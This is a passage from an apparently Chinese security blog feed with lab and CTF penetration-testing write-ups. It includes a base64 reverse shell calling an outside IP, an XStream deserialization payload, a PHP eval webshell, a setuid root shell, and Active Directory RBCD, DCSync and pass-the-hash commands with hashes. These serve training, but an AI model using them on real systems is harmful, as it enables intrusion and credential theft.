因此对域内非域控的所有机器都具有GenericAll权限</p><p>所以这里就可以打<code>RBCD</code>了</p><p>接下来三步走就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 addcomputer.py xiaorang.lab/zhangxin:&#x27;admin4qwY38cc&#x27; -dc-ip 172.22.60.8 -dc-host xiaorang.lab -computer-name &#x27;TEST$&#x27; -computer-pass &#x27;P@ssw0rd&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 rbcd.py xiaorang.lab/zhangxin:&#x27;admin4qwY38cc&#x27; -dc-ip 172.22.60.8 -action write -delegate-to &#x27;FILESERVER$&#x27; -delegate-from &#x27;TEST$&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 getST.py xiaorang.lab/&#x27;TEST$&#x27;:&#x27;P@ssw0rd&#x27; -spn cifs/FILESERVER.xiaorang.lab -impersonate Administrator -dc-ip 172.22.60.8</span><br></pre></td></tr></table></figure><p>这里话我们就获取到FILESERVER$这个机器的TGT票据了</p><p>然后直接注入本地来无密码登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure><p>修改/etc/hosts  不然等会域名解析会失败</p><p><img src="../images/image-20231024163431538.png" alt="image-20231024163431538"></p><p>然后无密码登录到FILESERVER$这个机器上  并且是system权限的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk</span><br></pre></td></tr></table></figure><p>然后就能拿flag了  然后因为这个FILESERVER$具有<code>DCSync</code>权限  </p><p>(因为我们是system权限了  所以我们能导出这台机器的本地hash值)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py -k -no-pass Fileserver.xiaorang.lab -dc-ip 172.22.60.8</span><br><span class="line"></span><br><span class="line">//类似于mimikatz的logonpasswords</span><br></pre></td></tr></table></figure><p>获取到了这台机器的hash值后  我们还是用上面的脚本  只不过这次是<code>DCSync</code>了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py xiaorang.lab/&#x27;Fileserver$&#x27;:@172.22.60.8 -hashes &#x27;:951d8a9265dfb652f42e5c8c497d70dc&#x27; -just-dc-user Administrator</span><br></pre></td></tr></table></figure><p>获取到域控hash之后  直接PTH打域控和其他机器了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes :c3cfdc08527ec4ab6aa3e630e79d349b Administrator@172.22.60.8 -codec gbk</span><br><span class="line"></span><br><span class="line">//域控</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes :c3cfdc08527ec4ab6aa3e630e79d349b xiaorang.lab/Administrator@172.22.60.15 -codec gbk</span><br><span class="line"></span><br><span class="line">//PC1</span><br></pre></td></tr></table></figure><p>结束了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fscan先扫一波&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231024153826631.png&quot; alt=&quot;image-20231024153826631&quot;&gt;&lt;/p&gt;
&lt;p&gt;一个80端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Delivery</title>
    <link href="https://ke1nys.github.io/posts/a3698f4a.html"/>
    <id>https://ke1nys.github.io/posts/a3698f4a.html</id>
    <published>2023-10-20T12:29:38.000Z</published>
    <updated>2023-10-20T14:12:45.767Z</updated>
    
    <content type="html"><![CDATA[<p>fscan先扫一下ip</p><p><img src="../images/image-20231020203451556.png" alt="image-20231020203451556"></p><p>存在一个ftp匿名登录 </p><p>1.txt中没有东西   pom.xml中有一个xstream的低版本漏洞</p><p><img src="../images/image-20231020203643428.png" alt="image-20231020203643428"></p><p><a href="https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/xstream/CVE-2021-29505/README.zh-cn.md</a></p><p>在你的vps上开放1099端口，然后用yso起一下服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">POST /just_sumbit_it HTTP/1.1</span><br><span class="line">Host: 39.99.234.228:8080</span><br><span class="line">Content-Length: 3115</span><br><span class="line">Accept: application/xml, text/xml, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/xml;charset=UTF-8</span><br><span class="line">Origin: http://39.99.234.228:8080</span><br><span class="line">Referer: http://39.99.234.228:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">    &lt;unserializable-parents/&gt;</span><br><span class="line">    &lt;java.util.PriorityQueue&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">            &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">                &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&lt;/m__obj&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">                    &lt;bodyParts/&gt;</span><br><span class="line">                    &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;</span><br><span class="line">                        &lt;nullIter class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                            &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;&gt;</span><br><span class="line">                                &lt;candidates class=&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;&gt;</span><br><span class="line">                                    &lt;names&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                    &lt;/names&gt;</span><br><span class="line">                                    &lt;ctx&gt;</span><br><span class="line">                                        &lt;environment/&gt;</span><br><span class="line">                                        &lt;registry class=&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                            &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                                &lt;string&gt;UnicastRef&lt;/string&gt;</span><br><span class="line">                                                &lt;string&gt;101.42.39.110&lt;/string&gt;</span><br><span class="line">                                                &lt;int&gt;1099&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;short&gt;0&lt;/short&gt;</span><br><span class="line">                                                &lt;boolean&gt;false&lt;/boolean&gt;</span><br><span class="line">                                            &lt;/java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                        &lt;/registry&gt;</span><br><span class="line">                                        &lt;host&gt;101.42.39.110&lt;/host&gt;</span><br><span class="line">                                        &lt;port&gt;1099&lt;/port&gt;</span><br><span class="line">                                    &lt;/ctx&gt;</span><br><span class="line">                                &lt;/candidates&gt;</span><br><span class="line">                            &lt;/aliases&gt;</span><br><span class="line">                        &lt;/nullIter&gt;</span><br><span class="line">                    &lt;/sm&gt;</span><br><span class="line">                &lt;/message&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure><p>然后监听端口就行</p><p><img src="../images/image-20231020203853327.png" alt="image-20231020203853327"></p><p>root权限直接拿flag</p><p><img src="../images/image-20231020203928761.png" alt="image-20231020203928761"></p><p>然后扫内网挂代理</p><p><img src="../images/image-20231020204709906.png" alt="image-20231020204709906"></p><p>整理信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.13.57   Centos  2049端口  NFS</span><br><span class="line"></span><br><span class="line">172.22.13.6    DC  XIAORANG\WIN-DC</span><br><span class="line"></span><br><span class="line">172.22.13.28    WIN-HAUWOLAO.xiaorang.lab 8000  mysql:172.22.13.28:3306:root 123456  OA系统 </span><br><span class="line"></span><br><span class="line">172.22.13.14   getshell主机  拿下</span><br></pre></td></tr></table></figure><p>这个NFS是关键  文件共享用的一个服务  默认端口2049</p><p>NFS 提权, 参考文章: <a href="https://xz.aliyun.com/t/11664">https://xz.aliyun.com/t/11664</a></p><p>大致就是 NFS 配置不当导致文件权限也能被共享过去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//因为本身ubuntu是不存在showmount这个工具的  所以我们得下载 但是下载源不对  所以我们要进行更改</span><br><span class="line">sudo sed -i &#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27; /etc/apt/sources.list</span><br><span class="line">sudo apt-get update</span><br><span class="line">apt-get install nfs-common -y</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">showmount -e 172.22.13.57      //查看哪些路径下的文件可以被共享</span><br><span class="line">Export list for 172.22.13.57:</span><br><span class="line">/home/joyce *   </span><br><span class="line"></span><br><span class="line">mount -t nfs 172.22.13.57:/home/joyce /tmp/joyce -o nolock   </span><br><span class="line"></span><br><span class="line">//进行挂载 我们就可以访问/home/joyce下的文件了</span><br></pre></td></tr></table></figure><p>这里的话我们使用写ssh公钥的方式进行登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span><br><span class="line">mkdir .ssh</span><br><span class="line">cat /root/.ssh/id_rsa.pub &gt;&gt; /tmp/joyce/.ssh/authorized_keys</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">ssh  -i /root/.ssh/id_rsa joyce@172.22.13.57</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231020205738859.png" alt="image-20231020205738859"></p><p>虽然flag在根目录下  但是我们并没有权限去读取他  这里的话有两个方法可以进行提权操作</p><ul><li>NFS提权</li></ul><p>这里能够提权的原因是  创建的文件共享过去的时候连着权限也一起传过去了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;#include&lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        setgid(0);</span><br><span class="line">        system(&quot;bash&quot;);</span><br><span class="line">&#125;&#x27; &gt; pwn.c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/tmp/joyce# echo &#x27;#include&lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        setgid(0);</span><br><span class="line">        system(&quot;bash&quot;);</span><br><span class="line">&#125;echo &#x27;#include&lt;unistd.h&gt;</span><br><span class="line">&gt; void main()</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;         setuid(0);</span><br><span class="line">&gt;         setgid(0);</span><br><span class="line">&gt;         system(&quot;bash&quot;);</span><br><span class="line">&gt; &#x27; &gt; pwn.c</span><br><span class="line">&#125;&#x27; &gt; pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# dir</span><br><span class="line">dir</span><br><span class="line">pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# ls</span><br><span class="line">ls</span><br><span class="line">pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# cat pwn.c</span><br><span class="line">cat pwn.c</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">        setuid(0);</span><br><span class="line">        setgid(0);</span><br><span class="line">        system(&quot;bash&quot;);</span><br><span class="line">&#125;</span><br><span class="line">root@ubuntu:/tmp/joyce# chmod -s pwn.c</span><br><span class="line">chmod -s pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# gcc pwn.c -o pwn</span><br><span class="line">gcc pwn.c -o pwn</span><br><span class="line">pwn.c: In function ‘main’:</span><br><span class="line">pwn.c:6:9: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]</span><br><span class="line">    6 |         system(&quot;bash&quot;);</span><br><span class="line">      |         ^~~~~~</span><br><span class="line">root@ubuntu:/tmp/joyce# ls</span><br><span class="line">ls</span><br><span class="line">pwn  pwn.c</span><br><span class="line">root@ubuntu:/tmp/joyce# gcc pwn.c -o pwn;;;</span><br><span class="line">gcc pwn.c -o pwn;;;</span><br><span class="line">bash: syntax error near unexpected token `;;&#x27;</span><br><span class="line">root@ubuntu:/tmp/joyce# chmod +s pwn</span><br><span class="line">chmod +s pwn</span><br><span class="line">root@ubuntu:/tmp/joyce# ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 52</span><br><span class="line">drwx------ 3  996  994  4096 Oct 20 21:03 .</span><br><span class="line">drwxrwxrwt 6 root root  4096 Oct 20 21:03 ..</span><br><span class="line">-rw------- 1  996  994    51 Oct 20 21:00 .bash_history</span><br><span class="line">-rw-r--r-- 1  996  994    18 Nov 25  2021 .bash_logout</span><br><span class="line">-rw-r--r-- 1  996  994   193 Nov 25  2021 .bash_profile</span><br><span class="line">-rw-r--r-- 1  996  994   231 Nov 25  2021 .bashrc</span><br><span class="line">drwxr-xr-x 2 root root  4096 Oct 20 20:57 .ssh</span><br><span class="line">-rwsr-sr-x 1 root root 16784 Oct 20 21:03 pwn</span><br><span class="line">-rw-r--r-- 1 root root    97 Oct 20 21:02 pwn.c</span><br></pre></td></tr></table></figure><p>这里创建好之后</p><p>ssh登录到刚刚的主机上</p><p><img src="../images/image-20231020212222420.png" alt="image-20231020212222420"></p><p>执行之后就拿下flag了</p><p><img src="../images/image-20231020212242659.png" alt="image-20231020212242659"></p><ul><li>这里讲第二种提权方式  就是ftp提权</li></ul><p><img src="../images/image-20231020212537916.png" alt="image-20231020212537916"></p><p>如果用原来的ftp的话是不行的  这里的话我们重新新建一个ftp  新建的话是有suid的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pyftpdlib -p 6666 -u test -P test -w &amp;</span><br></pre></td></tr></table></figure><p>然后连接上去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 172.22.13.14 6666</span><br><span class="line">put /flag02.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231020213622125.png" alt="image-20231020213622125"></p><p>然后在Ubuntu的那个主机上再次连接然后get下载下来读取就行了</p><p><img src="../images/image-20231020213732504.png" alt="image-20231020213732504"></p><p>然后一样的方法读取centos机器的目录下还有一个pAss.txt文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab/zhangwen\ QT62f3gBhK1</span><br><span class="line"></span><br><span class="line">//给了一个账号密码</span><br></pre></td></tr></table></figure><p>这就是两种不同的提权方法</p><blockquote><p>NFS是利用这个共享文件时权限也会共享过去</p><p>ftp是利用了suid这个权限</p></blockquote><p>接下来直接搭建隧道</p><p>这里拿下第二个flag之后  回看之前的信息收集  发现了一个弱口令的mysql</p><p>于是我们使用navicat来连接  mdut的话是udf提权失败</p><p><img src="../images/image-20231020214335122.png" alt="image-20231020214335122"></p><p>发现是任意路径可写  并且是以phpstudy启动的  于是直接写马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;C:/phpstudy_pro/WWW/1.php&quot;;</span><br></pre></td></tr></table></figure><p>然后蚁剑连接</p><p><img src="../images/image-20231020214523510.png" alt="image-20231020214523510"></p><p>因为是phpstudy启动的  权限高  所以可以直接读取</p><p><img src="../images/image-20231020214607268.png" alt="image-20231020214607268"></p><p>这个是我们刚刚获取到的用户名了  我们直接rdp上去运行sharphound.exe来看一下域内环境</p><p>(当然了  蚁剑上传文件查看也是可以的)</p><p><img src="../images/image-20231020214935835.png" alt="image-20231020214935835"></p><p>发现域中的chenglei用户是对这个域控有wirte写的权限  并且还是属于ACL admins组的</p><blockquote><p>那么可以直接写 DCSync / RBCD / Shadow Credentials</p></blockquote><p>这里测试了<code>Shadow Credentials</code>失败   不知道为啥…………………………………..</p><p>因为之前是用过了DCSync了  这次我们就用RBCD来打</p><p>addcomputer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains addcomputer.py xiaorang.lab/chenglei:&#x27;Xt61f3LBhg1&#x27; -dc-ip 172.22.13.6 -dc-host xiaorang.lab -computer-name &#x27;TEST$&#x27; -computer-pass &#x27;P@ssw0rd&#x27;</span><br></pre></td></tr></table></figure><p>rbcd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rbcd.py xiaorang.lab/chenglei:&#x27;Xt61f3LBhg1&#x27; -dc-ip 172.22.13.6 -action write -delegate-to &#x27;WIN-DC$&#x27; -delegate-from &#x27;TEST$&#x27;</span><br></pre></td></tr></table></figure><p>getst</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains getST.py xiaorang.lab/&#x27;TEST$&#x27;:&#x27;P@ssw0rd&#x27; -spn cifs/WIN-DC.xiaorang.lab -impersonate Administrator -dc-ip 172.22.13.6</span><br></pre></td></tr></table></figure><p>获取到这个ccache文件后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator.ccache</span><br><span class="line"></span><br><span class="line">然后修改/etc/hosts</span><br><span class="line">172.22.13.6     WIN-DC.xiaorang.lab</span><br><span class="line">加进去就行</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后使用psexec.py无密码登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py Administrator@WIN-DC.xiaorang.lab -k -no-pass -dc-ip 172.22.13.6</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231020215515800.png" alt="image-20231020215515800"></p><p>然后拿下最后一个flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fscan先扫一下ip&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231020203451556.png&quot; alt=&quot;image-20231020203451556&quot;&gt;&lt;/p&gt;
&lt;p&gt;存在一个ftp匿名登录 &lt;/p&gt;
&lt;p&gt;1.txt中没有东西 </summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>2023-香山杯-Web</title>
    <link href="https://ke1nys.github.io/posts/c253e927.html"/>
    <id>https://ke1nys.github.io/posts/c253e927.html</id>
    <published>2023-10-17T06:24:39.000Z</published>
    <updated>2023-10-20T14:12:45.764Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP-unserialize-pro"><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    class Welcome&#123;</span><br><span class="line">        public $name;</span><br><span class="line">        public $arg = &#x27;welcome&#x27;;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;name = &#x27;Wh0 4m I?&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;name == &#x27;A_G00d_H4ck3r&#x27;)&#123;</span><br><span class="line">                echo $this-&gt;arg;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class G00d&#123;</span><br><span class="line">        public $shell;</span><br><span class="line">        public $cmd;</span><br><span class="line">        public function __invoke()&#123;</span><br><span class="line">            $shell = $this-&gt;shell;</span><br><span class="line">            $cmd = $this-&gt;cmd;</span><br><span class="line">            if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $cmd))&#123;</span><br><span class="line">                die(&quot;U R A BAD GUY&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            eval($shell($cmd));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class H4ck3r&#123;</span><br><span class="line">        public $func;</span><br><span class="line">        public function __toString()&#123;</span><br><span class="line">            $function = $this-&gt;func;</span><br><span class="line">            $function();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#x27;data&#x27;]))</span><br><span class="line">        unserialize($_GET[&#x27;data&#x27;]);</span><br><span class="line">    else</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的关键点就是在绕过这个正则匹配  然后进行RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    public $shell;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $shell = $this-&gt;shell;</span><br><span class="line">        $cmd = $this-&gt;cmd;</span><br><span class="line">        if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $cmd))&#123;</span><br><span class="line">            die(&quot;U R A BAD GUY&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval($shell($cmd));</span><br><span class="line">    &#125;</span><br><span 